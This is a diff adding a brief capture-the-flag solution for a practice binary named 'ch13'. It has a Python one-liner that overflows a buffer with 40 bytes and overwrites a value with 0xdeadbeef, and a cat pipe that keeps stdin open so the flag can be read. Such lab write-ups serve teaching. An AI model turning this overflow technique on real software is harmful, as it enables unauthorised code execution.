@@ -1,0 +1,12 @@
+1. python -c 'print "A" * 40 + "\xef\xbe\xad\xde"' > /tmp/fresh
+
+2. cat /tmp/fresh - | ./ch13
+
+
+
+The "-" can be used as /dev/stdin & /dev/stdout. Hence, The program
+won't end, allowing us to grab flag.
+
+
+**NOTE - Never try to clipboard copy ASCII binary data on clipboard. 
+Clipboard is only made for text streams.
